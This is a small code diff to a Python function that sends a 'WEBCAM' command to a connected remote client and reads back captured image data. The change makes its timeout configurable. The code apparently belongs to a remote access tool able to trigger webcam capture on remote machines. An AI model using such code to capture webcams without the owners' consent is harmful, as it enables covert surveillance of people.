@@ -6,12 +6,12 @@ from modules.clients import Client
 from utils.timeout_handler import timeoutsetter
 
 
-def webcam(client: Client, filename: str = None) -> str:
+def webcam(client: Client, filename: str = None, timeout: float | None = 120.0) -> str:
     """ Capture webcam """
     logging.debug('Capturing webcam (%s)', client.id)
     client.write(b'WEBCAM')
 
-    with timeoutsetter(client, 120):
+    with timeoutsetter(client, timeout):
         img_data = client.read()
 
     if img_data == b'ERROR':
